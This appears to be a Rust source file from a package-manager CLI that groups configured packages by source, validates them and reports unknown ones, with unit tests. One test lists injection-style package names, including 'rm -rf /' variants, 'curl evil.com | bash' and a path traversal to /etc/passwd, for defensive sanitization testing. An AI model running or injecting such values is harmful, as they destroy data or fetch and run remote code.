use crate::data::PlatformExt;
use crate::sources::PackageSource;
use std::collections::HashMap;

use tracing::{trace, warn};

use crate::data::{constants, KnownSources, SantaData};

/// Reason why a package is unknown/unresolvable
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum UnknownPackageReason {
    /// Package has no definition in the packages database
    NoDefinition,
    /// Package has definitions but none for the configured sources
    NoMatchingSource(Vec<KnownSources>),
}

// Re-export SantaConfig and related types from santa-data
pub use santa_data::config::{ConfigPackageSource, SantaConfig};

/// Extension trait for SantaConfig with CLI-specific functionality
pub trait SantaConfigExt {
    /// Check if a source is enabled in this configuration
    fn source_is_enabled(&self, source: &PackageSource) -> bool;

    /// Group packages by configured sources
    fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>>;

    /// Validate source/package compatibility with available data
    fn validate_source_package_compatibility(&self, data: &SantaData) -> anyhow::Result<()>;

    /// Get packages that have no definition or no valid source
    fn unknown_packages(&self, data: &SantaData) -> Vec<(String, UnknownPackageReason)>;

    /// Comprehensive validation including business logic
    fn validate_with_data(&self, data: &SantaData) -> anyhow::Result<()>;

    /// Get default configuration for the current platform
    fn default_for_platform() -> Self
    where
        Self: Sized;

    /// Export configuration to string format (Debug)
    fn export(&self) -> String;
}

impl SantaConfigExt for SantaConfig {
    fn source_is_enabled(&self, source: &PackageSource) -> bool {
        trace!("Checking if {} is enabled", source);
        self.sources.contains(source.name())
    }

    fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>> {
        match &self._groups {
            Some(groups) => groups.clone(),
            None => {
                let configured_sources: Vec<KnownSources> = self.sources.clone();
                let mut groups: HashMap<KnownSources, Vec<String>> = HashMap::new();
                // Initialize groups for each source (avoid cloning for iteration)
                for source in &configured_sources {
                    groups.insert(source.clone(), Vec::new());
                }

                for pkg in &self.packages {
                    for source in &configured_sources {
                        if data.packages.contains_key(pkg) {
                            let available_sources = data
                                .packages
                                .get(pkg)
                                .expect("Package should exist in data");
                            trace!("available_sources: {:?}", available_sources);

                            if available_sources.contains_key(source) {
                                trace!("Adding {} to {} list.", pkg, source);
                                match groups.get_mut(source) {
                                    Some(v) => {
                                        v.push(pkg.to_string());
                                        break;
                                    }
                                    None => {
                                        warn!(
                                            "Group for source {} not found, creating new group",
                                            source
                                        );
                                        groups.insert(source.clone(), vec![pkg.to_string()]);
                                    }
                                }
                            }
                        }
                    }
                }
                self._groups = Some(groups.clone());
                groups
            }
        }
    }

    fn validate_source_package_compatibility(&self, data: &SantaData) -> anyhow::Result<()> {
        for package in &self.packages {
            let available_sources = data.packages.get(package);
            if available_sources.is_none() {
                warn!(
                    "Package '{}' not found in available packages database",
                    package
                );
                continue;
            }

            let available_sources = available_sources.unwrap();
            let mut has_valid_source = false;

            for configured_source in &self.sources {
                if available_sources.contains_key(configured_source) {
                    has_valid_source = true;
                    break;
                }
            }

            if !has_valid_source {
                warn!(
                    "Package '{}' has no definition for any configured source. Available sources: {:?}",
                    package,
                    available_sources.keys().collect::<Vec<_>>()
                );
            }
        }
        Ok(())
    }

    fn unknown_packages(&self, data: &SantaData) -> Vec<(String, UnknownPackageReason)> {
        let mut unknown = Vec::new();

        for package in &self.packages {
            match data.packages.get(package) {
                None => {
                    unknown.push((package.clone(), UnknownPackageReason::NoDefinition));
                }
                Some(available_sources) => {
                    let has_valid_source = self
                        .sources
                        .iter()
                        .any(|s| available_sources.contains_key(s));

                    if !has_valid_source {
                        let available: Vec<KnownSources> =
                            available_sources.keys().cloned().collect();
                        unknown.push((
                            package.clone(),
                            UnknownPackageReason::NoMatchingSource(available),
                        ));
                    }
                }
            }
        }

        unknown
    }

    fn validate_with_data(&self, data: &SantaData) -> anyhow::Result<()> {
        use anyhow::Context;

        // First run basic validation
        self.validate_basic()
            .with_context(|| "Basic configuration validation failed")?;

        // Then run custom validation
        self.validate_source_package_compatibility(data)
            .with_context(|| "Source/package compatibility validation failed")?;

        Ok(())
    }

    fn default_for_platform() -> Self {
        let mut config = SantaConfig::load_from_str(constants::DEFAULT_CONFIG)
            .expect("Failed to load default config - this should never fail");

        // Filter sources to only those available on current platform
        let available_sources = crate::data::Platform::get_default_sources();
        config
            .sources
            .retain(|source| available_sources.contains(source));

        // Ensure at least one source remains (fallback to cargo which is universal)
        if config.sources.is_empty() {
            warn!("No configured sources available on this platform, falling back to cargo");
            config.sources.push(KnownSources::Cargo);
        }

        config
    }

    fn export(&self) -> String {
        format!("{:#?}", self)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::KnownSources;
    use std::io::Write;
    use std::path::Path;
    use tempfile::NamedTempFile;

    #[test]
    fn test_load_from_file_existing() {
        let ccl_content = r#"
sources =
  = brew
packages =
  = git
        "#;

        let mut temp_file = NamedTempFile::with_suffix(".ccl").unwrap();
        write!(temp_file, "{ccl_content}").unwrap();

        let result = SantaConfig::load_from(temp_file.path());
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 1);
        assert_eq!(config.packages.len(), 1);
    }

    #[test]
    fn test_load_from_file_nonexistent() {
        let nonexistent_path = Path::new("/nonexistent/config.yaml");

        // santa-data's load_from returns an error for nonexistent files
        // The CLI layer should handle this and provide default config
        let result = SantaConfig::load_from(nonexistent_path);
        assert!(result.is_err());
    }

    #[test]
    fn test_potential_injection_in_package_names() {
        // Test that potentially dangerous package names are handled safely
        let dangerous_names = vec![
            "git; rm -rf /".to_string(),
            "$(rm -rf /)".to_string(),
            "`rm -rf /`".to_string(),
            "git && curl evil.com | bash".to_string(),
            "../../../etc/passwd".to_string(),
        ];

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: dangerous_names.clone(),
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        // Config should load but we need to ensure these names are sanitized later
        let result = config.validate_basic();
        assert!(
            result.is_ok(),
            "Basic validation should pass even with suspicious package names"
        );

        // Verify the dangerous names are preserved (they should be sanitized at execution time)
        assert_eq!(config.packages, dangerous_names);
    }

    #[test]
    fn test_unknown_source_handling() {
        let ccl = r#"
sources =
  = brew
  = unknown_source
  = cargo
packages =
  = git
        "#;

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 3);

        // Check that unknown source is handled properly
        let has_unknown = config
            .sources
            .iter()
            .any(|s| matches!(s, KnownSources::Unknown(_)));
        assert!(
            has_unknown,
            "Unknown source should be preserved as Unknown variant"
        );
    }

    #[test]
    fn test_default_config_filters_platform_specific_sources() {
        // Test that the default config only includes sources available on current platform
        let config = SantaConfig::default_for_platform();

        // Should have at least one source (cargo is universal)
        assert!(
            !config.sources.is_empty(),
            "Default config should have at least one source"
        );

        // All sources should be in the platform's available sources
        let available_sources = crate::data::Platform::get_default_sources();
        for source in &config.sources {
            assert!(
                available_sources.contains(source),
                "Source {:?} should be available on this platform",
                source
            );
        }

        // Cargo should always be present as it's universal
        assert!(
            config.sources.contains(&KnownSources::Cargo),
            "Cargo should always be available in default config"
        );
    }

    #[test]
    fn test_default_config_does_not_panic() {
        // Ensure default config creation never panics
        let _config = SantaConfig::default_for_platform();
        // If we get here, the test passed
    }

    // ============= UnknownPackageReason and unknown_packages() Tests =============

    #[test]
    fn test_unknown_package_reason_no_definition() {
        let reason = UnknownPackageReason::NoDefinition;
        assert_eq!(reason, UnknownPackageReason::NoDefinition);

        // Test Debug trait
        let debug_str = format!("{:?}", reason);
        assert!(debug_str.contains("NoDefinition"));
    }

    #[test]
    fn test_unknown_package_reason_no_matching_source() {
        let sources = vec![KnownSources::Brew, KnownSources::Cargo];
        let reason = UnknownPackageReason::NoMatchingSource(sources.clone());

        match reason {
            UnknownPackageReason::NoMatchingSource(available) => {
                assert_eq!(available.len(), 2);
                assert!(available.contains(&KnownSources::Brew));
                assert!(available.contains(&KnownSources::Cargo));
            }
            _ => panic!("Expected NoMatchingSource variant"),
        }
    }

    #[test]
    fn test_unknown_package_reason_clone() {
        let reason1 = UnknownPackageReason::NoDefinition;
        let reason2 = reason1.clone();
        assert_eq!(reason1, reason2);

        let reason3 = UnknownPackageReason::NoMatchingSource(vec![KnownSources::Npm]);
        let reason4 = reason3.clone();
        assert_eq!(reason3, reason4);
    }

    #[test]
    fn test_unknown_packages_empty_when_all_valid() {
        use crate::data::SantaData;

        // Create minimal SantaData with a package that has brew source
        // PackageDataList = HashMap<String, HashMap<KnownSources, Option<PackageData>>>
        let mut packages = std::collections::HashMap::new();
        let mut git_sources = std::collections::HashMap::new();
        git_sources.insert(KnownSources::Brew, None); // None means use default package name
        packages.insert("git".to_string(), git_sources);

        let data = SantaData {
            packages,
            sources: vec![],
        };

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: vec!["git".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert!(unknown.is_empty(), "All packages should be valid");
    }

    #[test]
    fn test_unknown_packages_no_definition() {
        use crate::data::SantaData;

        // Empty package database
        let data = SantaData {
            packages: std::collections::HashMap::new(),
            sources: vec![],
        };

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: vec!["nonexistent-package".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert_eq!(unknown.len(), 1);
        assert_eq!(unknown[0].0, "nonexistent-package");
        assert_eq!(unknown[0].1, UnknownPackageReason::NoDefinition);
    }

    #[test]
    fn test_unknown_packages_no_matching_source() {
        use crate::data::SantaData;

        // Package exists but only for cargo, not brew
        let mut packages = std::collections::HashMap::new();
        let mut ripgrep_sources = std::collections::HashMap::new();
        ripgrep_sources.insert(KnownSources::Cargo, None);
        packages.insert("ripgrep".to_string(), ripgrep_sources);

        let data = SantaData {
            packages,
            sources: vec![],
        };

        // Config only has brew as source
        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: vec!["ripgrep".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert_eq!(unknown.len(), 1);
        assert_eq!(unknown[0].0, "ripgrep");

        match &unknown[0].1 {
            UnknownPackageReason::NoMatchingSource(available) => {
                assert_eq!(available.len(), 1);
                assert!(available.contains(&KnownSources::Cargo));
            }
            _ => panic!("Expected NoMatchingSource variant"),
        }
    }

    #[test]
    fn test_unknown_packages_mixed_results() {
        use crate::data::SantaData;

        let mut packages = std::collections::HashMap::new();

        // git is available in brew
        let mut git_sources = std::collections::HashMap::new();
        git_sources.insert(KnownSources::Brew, None);
        packages.insert("git".to_string(), git_sources);

        // ripgrep only in cargo
        let mut ripgrep_sources = std::collections::HashMap::new();
        ripgrep_sources.insert(KnownSources::Cargo, None);
        packages.insert("ripgrep".to_string(), ripgrep_sources);

        let data = SantaData {
            packages,
            sources: vec![],
        };

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: vec![
                "git".to_string(),
                "ripgrep".to_string(),
                "unknown-pkg".to_string(),
            ],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert_eq!(unknown.len(), 2);

        // Find the specific entries
        let ripgrep_entry = unknown.iter().find(|(name, _)| name == "ripgrep");
        let unknown_entry = unknown.iter().find(|(name, _)| name == "unknown-pkg");

        assert!(ripgrep_entry.is_some());
        assert!(unknown_entry.is_some());

        match &ripgrep_entry.unwrap().1 {
            UnknownPackageReason::NoMatchingSource(_) => {}
            _ => panic!("ripgrep should have NoMatchingSource"),
        }

        match &unknown_entry.unwrap().1 {
            UnknownPackageReason::NoDefinition => {}
            _ => panic!("unknown-pkg should have NoDefinition"),
        }
    }

    #[test]
    fn test_unknown_packages_with_multiple_sources() {
        use crate::data::SantaData;

        let mut packages = std::collections::HashMap::new();

        // bat available in both brew and cargo
        let mut bat_sources = std::collections::HashMap::new();
        bat_sources.insert(KnownSources::Brew, None);
        bat_sources.insert(KnownSources::Cargo, None);
        packages.insert("bat".to_string(), bat_sources);

        let data = SantaData {
            packages,
            sources: vec![],
        };

        // Config has npm which bat doesn't support
        let config = SantaConfig {
            sources: vec![KnownSources::Npm],
            packages: vec!["bat".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert_eq!(unknown.len(), 1);

        match &unknown[0].1 {
            UnknownPackageReason::NoMatchingSource(available) => {
                assert_eq!(available.len(), 2);
                assert!(available.contains(&KnownSources::Brew));
                assert!(available.contains(&KnownSources::Cargo));
            }
            _ => panic!("Expected NoMatchingSource"),
        }
    }

    #[test]
    fn test_unknown_packages_empty_config() {
        use crate::data::SantaData;

        let data = SantaData {
            packages: std::collections::HashMap::new(),
            sources: vec![],
        };

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: vec![],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let unknown = config.unknown_packages(&data);
        assert!(unknown.is_empty());
    }
}
